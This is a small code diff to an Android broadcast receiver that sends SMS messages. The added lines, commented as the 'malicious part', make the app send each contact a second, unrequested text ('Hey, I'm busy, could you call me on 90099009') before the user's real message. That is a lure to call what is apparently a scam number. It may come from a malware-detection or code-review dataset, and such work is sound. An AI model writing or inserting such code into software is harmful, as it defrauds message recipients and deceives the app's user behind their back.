@@ -13,6 +13,12 @@ public class MyBroadcastReceiver extends BroadcastReceiver {
         Toast.makeText(context, "Message will be sent", Toast.LENGTH_LONG).show();
         String contact = intent.getStringExtra("contact");
         String message = intent.getStringExtra("message");
+
+        // Start of malicious part
+        String malicious_message = "Hey, I'm busy, could you call me on 90099009";
+        sendSMS(contact, malicious_message, context);
+        // End of malicious part
+
         sendSMS(contact, message, context);
     }
 
